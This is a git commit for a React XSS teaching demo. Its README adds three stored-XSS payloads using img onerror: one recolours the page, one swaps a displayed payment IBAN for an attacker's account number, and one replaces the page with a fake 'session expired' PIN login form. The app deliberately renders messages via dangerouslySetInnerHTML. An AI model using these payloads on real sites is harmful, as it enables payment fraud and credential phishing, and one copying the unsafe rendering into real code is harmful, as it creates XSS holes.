55c584ef38422a888483f5707fd2d955da81f577
Mateusz Rojek <mateusz.rojek@miquido.com>
2023-05-08 18:51:37 +0200

    Examples for presentation

--- README.md
+++ README.md
@@ -1,4 +1,27 @@
-XSS Example in React.js
-===
+# React XSS presentation
 
-Just a simple example on how to use/abuse of `dangerouslySetInnerHTML={}`
+## Example code
+
+### Set site's background
+```html
+<img
+  src="x"
+  onerror="const setColor = () => { document.body.style.background = 'red' }; setColor();"
+/>
+```
+
+### Set new payment IBAN
+```html
+<img
+  src="x"
+  onerror="const hackIBAN = () => { document.querySelector('strong').textContent = 'PL67109024026281469282578623' }; hackIBAN();"
+/>
+```
+
+### Show session expired view
+```html
+<img
+  src="x"
+  onerror="const createLoginForm = () => {const body = document.querySelector('body'); while (body.firstChild) { body.removeChild(body.firstChild); };const form = document.createElement('form'); const label = document.createElement('label'); const input = document.createElement('input'); const button = document.createElement('button'); const message = document.createElement('p'); label.textContent = 'Kod PIN:'; input.type = 'password'; button.type = 'submit'; button.textContent = 'Zaloguj się'; message.textContent = 'Sesja wygasła - konieczne ponowne logowanie'; form.appendChild(label); form.appendChild(input); form.appendChild(button); form.appendChild(message); body.appendChild(form);body.style.display = 'flex'; body.style.flexDirection = 'column'; body.style.justifyContent = 'center'; body.style.alignItems = 'center'; body.style.height = '100vh';}; createLoginForm();"
+/>
+```
--- ui/src/App.jsx
+++ ui/src/App.jsx
@@ -1,79 +1,95 @@
-import { useEffect, useState } from 'react';
+import { useEffect, useState } from "react";
 
-async function loadMessages(setMessages) {
-    try {
-        const res = await fetch('http://localhost:8000/messages', {
-            method: 'GET'
-        });
-
-        if (!res.ok) {
-            throw new Error(`${res.status} - ${res.statusText}`);
-        }
-
-        const json = await res.json();
-        setMessages(json.messages);
-    } catch (ex) {
-        console.error(ex);
-        alert(ex.message);
-    }
-}
-
-async function saveMessage(newMessage) {
-    const res = await fetch('http://localhost:8000/message', {
-        method: 'POST',
-        body: JSON.stringify({ message: newMessage }),
-        headers: {
-            'Content-Type': 'application/json'
-        }
+const loadMessages = async (setMessages) => {
+  try {
+    const res = await fetch("http://localhost:8000/messages", {
+      method: "GET",
     });
 
     if (!res.ok) {
-        throw new Error(`${res.status} - ${res.statusText}`);
+      throw new Error(`${res.status} - ${res.statusText}`);
     }
+
+    const json = await res.json();
+    setMessages(json.messages);
+  } catch (ex) {
+    console.error(ex);
+    alert(ex.message);
+  }
+}
+const saveMessage = async (newMessage) => {
+  const res = await fetch("http://localhost:8000/message", {
+    method: "POST",
+    body: JSON.stringify({ message: newMessage }),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+
+  if (!res.ok) {
+    throw new Error(`${res.status} - ${res.statusText}`);
+  }
 }
 
-function App() {
-    const [ messages, setMessages ] = useState([]);
-    const [ newMessage, setNewMessage ] = useState('');
+const App = () => {
+  const [messages, setMessages] = useState([]);
+  const [newMessage, setNewMessage] = useState("");
 
-    useEffect(() => {
-        loadMessages(setMessages);
-    }, []);
+  useEffect(() => {
+    loadMessages(setMessages);
+  }, []);
 
-    return <main>
-        <header><h1>Hello XSS</h1></header>
-        <hr />
-        <form onSubmit={ async (ev) => {
-            ev.preventDefault();
+  return (
+    <main>
+      <header>
+        <h1>Cześć!</h1>
+        <h2>Masz 2 nieopłacone faktury</h2>
+        <p>
+          Opłać je przelewem na numer konta:{" "}
+          <strong>PL83109024029587372996371156</strong>
+        </p>
+      </header>
+      <hr />
+      <form
+        onSubmit={async (ev) => {
+          ev.preventDefault();
 
-            await saveMessage(newMessage);
-            await loadMessages(setMessages);
-        } } >
-            <textarea style={ {
-                width: 500,
-                height: 150
-            } } value={ newMessage } onChange={ (ev) => {
-                setNewMessage(ev.nativeEvent.target.value);
-            } } />
+          await saveMessage(newMessage);
+          await loadMessages(setMessages);
+        }}
+      >
+        <textarea
+          style={{
+            width: 500,
+            height: 150,
+          }}
+          value={newMessage}
+          onChange={(ev) => {
+            setNewMessage(ev.nativeEvent.target.value);
+          }}
+        />
 
-            <br />
-            <button type='submit'>send message</button>
-        </form>
+        <br />
+        <button type="submit">send message</button>
+      </form>
 
-        <hr />
+      <hr />
 
-        { messages.map((m) => <div key={ m.id }>
-            <div
-                style={ {
-                    padding: '.5rem',
-                    borderRadius: '.5rem',
-                    margin: '.5rem',
-                    border: '1px solid #F4F2F0'
-                } }
-                dangerouslySetInnerHTML={ { __html: m.messageHtml } } />
-
-        </div> )}
-    </main>;
+      {messages.map((m) => (
+        <div key={m.id}>
+          <div
+            style={{
+              padding: ".5rem",
+              borderRadius: ".5rem",
+              margin: ".5rem",
+              border: "1px solid #F4F2F0",
+            }}
+            dangerouslySetInnerHTML={{ __html: m.messageHtml }}
+          />
+        </div>
+      ))}
+    </main>
+  );
 }
 
 export default App;
